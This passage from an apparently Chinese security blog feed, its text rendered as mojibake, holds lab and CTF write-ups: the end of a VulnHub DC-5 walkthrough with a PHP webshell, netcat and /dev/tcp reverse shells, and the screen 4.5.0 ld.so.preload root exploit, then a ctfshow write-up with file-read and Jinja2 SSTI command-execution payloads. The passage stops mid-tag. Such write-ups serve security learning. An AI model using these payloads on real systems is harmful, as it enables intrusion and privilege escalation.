alt="Untitled"></p><p>å½“æˆ‘ä»¥ä¸ºé¶æœºåäº†çš„æ—¶å€™ï¼Œæˆ‘æ‰“å¼€æˆ‘çš„xhellå‡†å¤‡å…³é—­ï¼Œä½†ä¸€çœ‹</p><p>OHHHHHï¼</p><p><img src="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-14.png" class="lazyload placeholder" data-srcset="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-14.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>åˆšæ‰åå¼¹shellè¿˜å‰©ä¸ªå‘½ä»¤è¡Œï¼ˆå¾ˆéš¾å—çš„ä¸€ä¸ªå‘½ä»¤è¡Œçª—å£ï¼Œä¸èƒ½ä»»æ„æ“ä½œï¼‰</p><p>æ‰€ä»¥æˆ‘å‡†å¤‡åˆ©ç”¨è¿™ä¸ªå‘½ä»¤è¡Œæ¥åˆ›å»ºä¸€ä¸ªæ–°é©¬ï¼Œé¦–å…ˆæŸ¥çœ‹<code>id</code>ï¼Œå‘ç°æ˜¯<code>www-data</code>æƒé™ï¼Œåœ¨ç½‘ç«™ç›®å½•ä¸‹åˆ›å»ºæ–‡ä»¶å¤¹å¤±è´¥</p><p>æˆ‘ä»¬å¯ä»¥å…ˆæŸ¥çœ‹ä¸€ä¸‹å“ªäº›æ–‡ä»¶å¤¹æ™®é€šç”¨æˆ·æœ‰æƒé™å†™å…¥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l / <span class="comment">#çœ‹ä¸€ä¸‹æ ¹ç›®å½•</span></span><br></pre></td></tr></table></figure><p><img src="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-15.png" class="lazyload placeholder" data-srcset="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-15.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>å‘ç°è¿™ä¸ªtmpç›®å½•æƒé™æŒºé«˜çš„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;?php eval(system(\$_POST[b]));?&gt;&quot;</span> &gt; /tmp/<span class="number">6</span>.txt</span><br></pre></td></tr></table></figure><p>ç›´æ¥åˆ›å»ºä¸€ä¸ªæ–‡ä»¶</p><p><img src="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-16.png" class="lazyload placeholder" data-srcset="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-16.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>è¿™æ ·å°±é‡æ–°è¿ä¸Šäº†ï¼ˆä½†æ˜¯webshellä¾ç„¶æ²¡æå®šï¼‰</p><p>ç„¶ååˆå›åˆ°åˆšæ‰é‚£ä¸ªéš¾å—çš„çª—å£ï¼Œå­¦åˆ°äº†ä¸ªæ–°æŠ€å·§åˆ‡æ¢åˆ°shellå¤–å£³ï¼ˆå¯ä»¥æ¥æ”¶äº¤äº’å¼shellï¼‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-17.png" class="lazyload placeholder" data-srcset="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-17.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>è¡¥å……ä¸€ä¸‹é‚£ä¸ªéš¾å—çš„åå¼¹shellï¼Œä½†æ²¡åŠæ³•ï¼Œå› ä¸ºå‘é€è¯·æ±‚æ—¶ç”¨<code>sh -i &gt;&amp; /dev/tcp/192.168.153.138/8888 0&gt;&amp;1</code>çš„è¯<code>&amp;</code>ä¼šè¢«è¯¯ä»¥ä¸ºè¯·æ±‚å‚æ•°çš„è¿æ¥ç¬¦</p><p>æ‰€ä»¥ä½¿ç”¨äº†ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -c sh <span class="number">192.168</span>.<span class="number">153.138</span> <span class="number">8888</span></span><br><span class="line"><span class="number">138</span>è™šæ‹Ÿæœºå¼€å¯ç›‘å¬ï¼šnc -lvnp <span class="number">8888</span></span><br></pre></td></tr></table></figure><h1 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h1><p>æƒé™å¤ªä½äº†ï¼Œå¾ˆå¤šæ“ä½œéƒ½è¢«é™åˆ¶äº†ï¼Œæå‡ä¸€ä¸‹æƒé™ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">å°†å¯ä»¥ææƒçš„å‘½ä»¤è¾“å‡ºåˆ°/tmp/<span class="number">1</span>.txt</span><br><span class="line">find / -perm -<span class="number">4000</span> -o -perm -<span class="number">2000</span> &gt;&gt; /tmp/<span class="number">1</span>.txt</span><br><span class="line">æˆ–</span><br><span class="line">find / -user root -perm -<span class="number">4000</span> -<span class="keyword">print</span> <span class="number">2</span>&gt;/dev/<span class="literal">null</span> </span><br><span class="line"></span><br><span class="line">findï¼šè¡¨ç¤ºæ‰§è¡Œ find å‘½ä»¤ï¼Œç”¨äºåœ¨æ–‡ä»¶ç³»ç»Ÿä¸­æœç´¢æ–‡ä»¶å’Œç›®å½•ã€‚</span><br><span class="line">    /ï¼šè¡¨ç¤ºè¦æœç´¢çš„èµ·å§‹è·¯å¾„ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œ/ è¡¨ç¤ºä»æ ¹ç›®å½•å¼€å§‹æœç´¢æ•´ä¸ªæ–‡ä»¶ç³»ç»Ÿã€‚</span><br><span class="line">    -user rootï¼šè¡¨ç¤ºåŒ¹é…æ‰€æœ‰è€…ä¸º root çš„æ–‡ä»¶ã€‚</span><br><span class="line">    -perm -<span class="number">4000</span>ï¼šè¡¨ç¤ºåŒ¹é…å…·æœ‰ setuid æƒé™ï¼ˆæ•°å­— <span class="number">4000</span>ï¼‰çš„æ–‡ä»¶ã€‚åŠ å· - è¡¨ç¤ºåŒ¹é…ç²¾ç¡®çš„æƒé™ã€‚</span><br><span class="line">    -<span class="keyword">print</span>ï¼šè¡¨ç¤ºæ‰“å°åŒ¹é…åˆ°çš„æ–‡ä»¶è·¯å¾„ã€‚</span><br><span class="line"></span><br><span class="line">æœ€åçš„ <span class="number">2</span>&gt;/dev/<span class="literal">null</span> æ˜¯å°†æ ‡å‡†é”™è¯¯è¾“å‡ºé‡å®šå‘åˆ°ç©ºè®¾å¤‡ï¼Œä»¥é˜²æ­¢é”™è¯¯æ¶ˆæ¯æ˜¾ç¤ºåœ¨ç»ˆç«¯ä¸Šã€‚</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹</p><p><img src="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-18.png" class="lazyload placeholder" data-srcset="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-18.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>å‘ç°screen-4.5.0</p><p>åœ¨kaliä¸ŠæŸ¥æ‰¾å¯ç”¨äºscreen 4.5.0çš„æ¼æ´è„šæœ¬æ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit screen <span class="number">4.5</span>.<span class="number">0</span></span><br></pre></td></tr></table></figure><p><img src="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-19.png" class="lazyload placeholder" data-srcset="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-19.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>PSï¼š<code>searchsploit</code> æ˜¯ä¸€æ¬¾åœ¨expä»“åº“ä¸­æœç´¢å¯ç”¨expçš„å·¥å…·</p><p>æŸ¥çœ‹ä¸€ä¸‹expï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/share/exploitdb/exploits/linux/local/<span class="number">41154</span>.sh</span><br></pre></td></tr></table></figure><p><img src="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-20.png" class="lazyload placeholder" data-srcset="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-20.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><ol><li>åˆ›å»ºç¬¬ä¸€ä¸ªæ–‡ä»¶ï¼Œå¹¶å¤åˆ¶ä¸€ä¸‹ä»£ç å—</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">vi libhax.c</span><br><span class="line"></span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line">void dropshell(void)&#123;</span><br><span class="line">    chown(&quot;/tmp/rootshell&quot;, 0, 0);</span><br><span class="line">    chmod(&quot;/tmp/rootshell&quot;, 04755);</span><br><span class="line">    unlink(&quot;/etc/ld.so.preload&quot;);</span><br><span class="line">    printf(&quot;[+] done!\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>åˆ›å»ºç¬¬äºŒä¸ªæ–‡ä»¶ï¼Œå¤åˆ¶ç¬¬äºŒä¸ªä»£ç å—</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">vi rootshell.c</span><br><span class="line"></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="keyword">int</span> <span class="title function_ invoke__">main</span>(<span class="keyword">void</span>)&#123;</span><br><span class="line"><span class="title function_ invoke__">setuid</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">setgid</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">seteuid</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">setegid</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">execvp</span>(<span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>ç¼–è¯‘æ–‡ä»¶</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIC -shared -ldl -o libhax.so libhax.c</span><br><span class="line">gcc -o rootshell rootshell.c</span><br></pre></td></tr></table></figure><p><img src="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-21.png" class="lazyload placeholder" data-srcset="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-21.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p><img src="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-22.png" class="lazyload placeholder" data-srcset="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-22.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>æ¥ä¸‹æ¥å°±æ˜¯æŠŠexpå‘é€åˆ°é¶æœº</p><p>kaliå¼€å¯æœåŠ¡</p><p><img src="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-23.png" class="lazyload placeholder" data-srcset="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-23.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>åˆ‡æ¢åˆ°tmpç›®å½•å¹¶ä¸‹è½½exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">www-data@dc-<span class="number">5</span>:/tmp$ wget <span class="number">192.168</span>.<span class="number">153.129</span>:<span class="number">9999</span>/libhax.so</span><br><span class="line">www-data@dc-<span class="number">5</span>:/tmp$ wget <span class="number">192.168</span>.<span class="number">153.129</span>:<span class="number">9999</span>/rootshell</span><br></pre></td></tr></table></figure><p>æœ€åå°±æ˜¯æ‰§è¡Œexpçš„æœ€åä¸€æ®µ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd /etc</span><br><span class="line">umask <span class="number">000</span></span><br><span class="line">screen -D -m -L ld.so.preload <span class="keyword">echo</span> -ne <span class="string">&quot;\x0a/tmp/libhax.so&quot;</span></span><br><span class="line">screen â€“ls</span><br><span class="line">/tmp/rootshell</span><br></pre></td></tr></table></figure><ul><li><p>å¹»æƒ³æ—¶é—´ï¼š</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@dc-<span class="number">5</span>:id</span><br><span class="line">root</span><br></pre></td></tr></table></figure></li><li><p>ç°å®ï¼š</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">www-data@dc-<span class="number">5</span>:/tmp$ ./<span class="number">2</span>.sh</span><br><span class="line">./<span class="number">2</span>.sh</span><br><span class="line"><span class="string">&#x27; from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.</span></span><br><span class="line"><span class="string">[+] done!</span></span><br><span class="line"><span class="string">Please set a terminal type.</span></span><br><span class="line"><span class="string">/tmp/rootshell: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34&#x27;</span> not <span class="title function_ invoke__">found</span> (required by /tmp/rootshell)</span><br></pre></td></tr></table></figure><p>  6ï¼Œæ²¡ææƒæˆåŠŸï¼Œæ²¡æ‰¾åˆ°æ˜¯ä»€ä¹ˆé—®é¢˜ï¼Œé </p></li></ul>]]></content>
      
      
      <categories>
          
          <category> ç½‘ç»œå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ„šäººæ¯wp</title>
      <link href="/2023/06/27/yu-ren-bei-wp/"/>
      <url>/2023/06/27/yu-ren-bei-wp/</url>
      
        <content type="html"><![CDATA[<h1 id="æ„šäººæ¯"><a href="#æ„šäººæ¯" class="headerlink" title="æ„šäººæ¯"></a>æ„šäººæ¯</h1><h1 id="çƒ­èº«èµ›ï¼š"><a href="#çƒ­èº«èµ›ï¼š" class="headerlink" title="çƒ­èº«èµ›ï¼š"></a>çƒ­èº«èµ›ï¼š</h1><p>æœ‰ç‚¹å‘ï¼Œåˆšå¼€å§‹æ—¶è„‘å­çœŸæ²¡ååº”è¿‡æ¥</p><p><img src="/2023/06/27/yu-ren-bei-wp/Untitled.png" class="lazyload placeholder" data-srcset="/2023/06/27/yu-ren-bei-wp/Untitled.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>flagå°±æ˜¯â€œä¸€ä¸ªä¸èƒ½è¯´çš„å¯†ç â€ï¼Œç»äº†ï¼Œæˆ‘è¿˜ä»¥ä¸ºflagæ˜¯â€œç¾¤ä¸»å–œæ¬¢36dâ€ï¼ˆbushiï¼‰</p><h1 id="easy-signin"><a href="#easy-signin" class="headerlink" title="easy_signin"></a><strong>easy_signin</strong></h1><p>é¢˜ç›®ï¼š</p><p><img src="/2023/06/27/yu-ren-bei-wp/Untitled1.png" class="lazyload placeholder" data-srcset="/2023/06/27/yu-ren-bei-wp/Untitled1.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>å¯ä»¥çœ‹åˆ°urlé‡Œæœ‰ä¸€ä¸ªimg&#x3D;xxx</p><p>xxxä¸ºåå…­ç¼–ç </p><p>æˆ‘ä»¬è¯•ä¸€ä¸‹ç”¨index.phpè½¬æ¢ä¸ºbase64ï¼š<code>aW5kZXgucGhw</code></p><p>åŒ…å«<code>aW5kZXgucGhw</code></p><p>å¾—åˆ°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAKLyoKIyAtKi0gY29kaW5nOiB1dGYtOCAtKi0KIyBAQXV0aG9yOiBoMXhhCiMgQERhdGU6ICAgMjAyMy0wMy0yNyAxMDozMDozMAojIEBMYXN0IE1vZGlmaWVkIGJ5OiAgIGgxeGEKIyBATGFzdCBNb2RpZmllZCB0aW1lOiAyMDIzLTAzLTI4IDEyOjE1OjMzCiMgQGVtYWlsOiBoMXhhQGN0ZmVyLmNvbQojIEBsaW5rOiBodHRwczovL2N0ZmVyLmNvbQoKKi8KCiRpbWFnZT0kX0dFVFsnaW1nJ107CgokZmxhZyA9ICJjdGZzaG93ezBmZTk1YjRhLTU2NjEtNDU0OS04NzMxLTA1OTk0NzYyYmJhYX0iOwppZihpc3NldCgkaW1hZ2UpKXsKCSRpbWFnZSA9IGJhc2U2NF9kZWNvZGUoJGltYWdlKTsKCSRkYXRhID0gYmFzZTY0X2VuY29kZShmaWxlX2dldF9jb250ZW50cygkaW1hZ2UpKTsKCWVjaG8gIjxpbWcgc3JjPSdkYXRhOmltYWdlL3BuZztiYXNlNjQsJGRhdGEnLz4iOwp9ZWxzZXsKCSRpbWFnZSA9IGJhc2U2NF9lbmNvZGUoImZhY2UucG5nIik7CgloZWFkZXIoImxvY2F0aW9uOi8/aW1nPSIuJGltYWdlKTsKfQoKCgoK</span><br></pre></td></tr></table></figure><p>è¿›è¡Œbase64è§£ç å¾—åˆ°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/*</span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2023-03-27 10:30:30</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2023-03-28 12:15:33</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line">- /</span><br><span class="line">$image=$_GET[<span class="string">&#x27;img&#x27;</span>];</span><br><span class="line">$flag = <span class="string">&quot;ctfshow&#123;0fe95b4a-5661-4549-8731-05994762bbaa&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(isset($image))&#123;</span><br><span class="line">$image = base64_decode($image);</span><br><span class="line">$data = base64_encode(file_get_contents($image));</span><br><span class="line">echo <span class="string">&quot;&lt;img src=&#x27;data:image/png;base64,$data&#x27;/&gt;&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$image = base64_encode(<span class="string">&quot;face.png&quot;</span>);</span><br><span class="line">header(<span class="string">&quot;location:/?img=&quot;</span>.$image);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°flag</p><h1 id="easy-ssti"><a href="#easy-ssti" class="headerlink" title="easy_ssti"></a><strong>easy_ssti</strong></h1><p>é¢˜ç›®ï¼šé¡µé¢æç¤ºæœ‰ä¸ªapp.pyåŒ…ï¼Œæˆ‘ä»¬ä¸‹è½½æ¥çœ‹ä¸€ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template_string,render_template</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>(<span class="params">name=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;hello.html&#x27;</span>,name=name)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello/&lt;name&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hellodear</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;ge&quot;</span> <span class="keyword">in</span> name:</span><br><span class="line">        <span class="keyword">return</span> render_template_string(<span class="string">&#x27;hello %s&#x27;</span> % name)</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;f&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> name:</span><br><span class="line">        <span class="keyword">return</span> render_template_string(<span class="string">&#x27;hello %s&#x27;</span> % name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Nonononon&#x27;</span></span><br></pre></td></tr></table></figure><p>æ˜¯é“SSTIæ³¨å…¥ï¼Œæˆ‘ä»¬éœ€è¦è®¿é—®<code>/hello.html</code>ï¼Œæ‹¼æ¥ï¼š<code>/hello.html/&#123;&#123;payload&#125;&#125;</code>è¿›è¡Œæ³¨å…¥</p><p>å…ˆè¯•ä¸€ä¸‹2ï¼Œæ²¡é—®é¢˜ï¼Œé¡µé¢è¿”å›2ï¼Œè¯æ˜ä»£ç æˆåŠŸè¿è¡Œäº†</p><p>æ€è·¯ï¼š</p><p>åˆ©ç”¨<code>&quot;&quot;.__class__.__bases__[0].__subclasses__()[83]</code>æ„é€ å‡ºæˆ‘ä»¬æƒ³è¦çš„ç±»</p><p><code>&quot;&quot;.__class__</code>ï¼šå½“å‰å˜é‡çš„ç±»</p><p><code>&quot;&quot;.__class__.___bases__[0]</code>ï¼šå½“å‰å˜é‡çš„ç±»çš„åŸºç±»ï¼ˆæœ€åŸºç¡€çš„ç±»ï¼Œ[0]è¡¨ç¤ºobjectç±»ï¼‰</p><p><code>&quot;&quot;.__class__.__bases__[0].__subclasses__()[83]</code> å½“å‰å˜é‡çš„ç±»çš„åŸºç±»çš„å­ç±»ï¼ˆåˆ°è¿™é‡Œå·²ç»åŒ…å«äº†å…¶ä»–ç±»ï¼Œ83è¡¨ç¤ºæ•°ç»„ä¸­çš„ç´¢å¼•ï¼ŒæŒ‡å‘ä¸€ä¸ªç±»ï¼Œ83æ˜¯é€šè¿‡çˆ†ç ´å‡ºæ¥çš„ï¼Œä¸€è¾¹çˆ†ç ´ä¸€è¾¹çœ‹åŒ…è¿”å›é•¿åº¦åŠå†…å®¹ï¼‰</p><p>ç„¶å<code>__init__</code>è¡¨ç¤ºå°†ç±»åˆå§‹åŒ–ï¼ˆæœ‰ç‚¹åƒå®ä¾‹åŒ–ï¼Œä¸ç¡®å®šï¼‰</p><p><code>__globals__</code> å–functionæ‰€å¤„ç©ºé—´ä¸‹å¯ä½¿ç”¨çš„moduleã€æ–¹æ³•ä»¥åŠæ‰€æœ‰å˜é‡</p><p><code>__globals__[&#39;__builtins__&#39;]</code> è¡¨ç¤ºç±»é‡Œé¢çš„å‡½æ•°äº†ï¼ˆè¿™é‡Œå¯ä»¥è¾“å‡ºçœ‹ä¸€ä¸‹æœ‰ä»€ä¹ˆå‡½æ•°ï¼Œå¦‚æœæ²¡æœ‰æˆ‘ä»¬è¦çš„å¯ä»¥æ›´æ”¹<code>__subclasses__[]</code>çœ‹ä¸€ä¸‹æœ‰æ²¡æœ‰æˆ‘ä»¬æƒ³è¦çš„ï¼‰</p><p><code>__globals__[&#39;__builtins__&#39;][&#39;eval&#39;]()</code> è°ƒç”¨evalå‡½æ•°</p><p>ä¼ å‚<code>(&quot;__import__(&#39;os&#39;).popen(&#39;echo Y2F0IC9mbGFn |base64 -d|sh&#39;).read()&quot;)</code></p><p>è¿™é‡Œå·²ç»æ˜¯æ‰§è¡Œpythonä»£ç äº†ï¼Œæˆ‘ä»¬åŠ¨æ€å¯¼å…¥osåº“ï¼Œç„¶åè°ƒç”¨popenæ‰§è¡Œï¼Œç”¨read()è¯»å–</p><p>è¿™é‡Œå‡ºç°äº†ä¸ªé—®é¢˜ï¼Œå°±æ˜¯ä¼ å…¥å‚æ•°ä¸­å±è”½äº†æ–œæ†â€œ<code>/</code>â€ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä½¿ç”¨base64ç¼–ç ç»•è¿‡</p><p>ä½†åˆå‡ºæ¥ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¥å‰ç”¨çš„æ˜¯<code>bash</code>ï¼Œä½†è¿™é‡Œå‘ç°ä¸è¡Œï¼Œæ‰€ä»¥æ ¹æ®ç»éªŒæ”¹ä¸º<code>sh</code></p><p>æœ€åå¾—åˆ°payload:</p><p><code>http://af57955d-b019-4224-9356-8e996bc58900.challenge.ctf.show/hello/&#123;&#123;"".__class__.__bases__[0].__subclasses__()[83].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('echo Y2F0IC9mbGFn |base64 -d|sh').read()")&#125;&#125;</code></p><p>æˆåŠŸï¼ï¼ï¼</p><p><img src="/2023/06/27/yu-ren-bei-wp/Untitled2.png" class="lazyload placeholder" data-srcset="/2023/06/27/yu-ren-bei-wp/Untitled2.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><h1 id="easy-flask"><a href="#easy-flask" class="headerlink" title="easy_flask"></a><strong>easy_flask</strong></h1><p>çŸ¥è¯†ç‚¹ï¼š</p><ul><li>flask sessionä¼ªé€ </li><li>flaskä»£ç å®¡è®¡</li><li>ä»»æ„æ–‡ä»¶ä¸‹è½½</li></ul><p>é¢˜ç›®ï¼š</p><p>è¿›æ¥ä¹‹åæœ‰ä¸¤ä¸ªçª—å£ï¼Œä¸€ä¸ªç™»å½•çª—å£å’Œä¸€ä¸ªæ³¨å†Œçª—å£</p><p><img src="/2023/06/27/yu-ren-bei-wp/Untitled3.png" class="lazyload placeholder" data-srcset="/2023/06/27/yu-ren-bei-wp/Untitled3.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>åœ¨æ³¨å†Œçª—å£å°è¯•æ³¨å†Œäº†adminï¼Œå‘ç°ç”¨æˆ·å·²å­˜åœ¨</p><p><img src="/2023/06/27/yu-ren-bei-wp/Untitled4.png" class="lazyload placeholder" data-srcset="/2023/06/27/yu-ren-bei-wp/Untitled4.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>ç„¶ååœ¨è¿™é‡Œåœ¨ç™»å½•å’Œæ³¨å†Œè¯•äº†sqlæ³¨å…¥ï¼Œæ²¡æˆåŠŸ</p><p>æˆ‘ä»¬å…ˆéšä¾¿æ³¨å†Œä¸€ä¸ªè´¦å·ï¼Œç™»å½•è¿›å»</p><p><img 